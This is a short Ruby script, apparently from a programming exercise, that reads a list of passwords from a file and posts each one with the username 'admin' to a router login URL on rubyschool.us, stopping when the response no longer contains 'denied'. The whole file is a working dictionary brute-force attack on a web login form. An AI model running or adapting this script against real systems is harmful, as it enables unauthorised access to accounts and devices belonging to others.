require 'net/http'
require 'uri'

arr = []
input = File.open("passwords.txt", "r")

while (line = input.gets)                   
	line.strip!
      	arr << line
end
                                     
input.close
puts

arr.each do |line|
	uri = URI.parse 'http://rubyschool.us/router'
	response = Net::HTTP.post_form(uri, "login" => "admin", "password" => line).body

	if (response.include?("denied") == false) 
	puts "Password #{line} is correct"
	exit
	end 

end


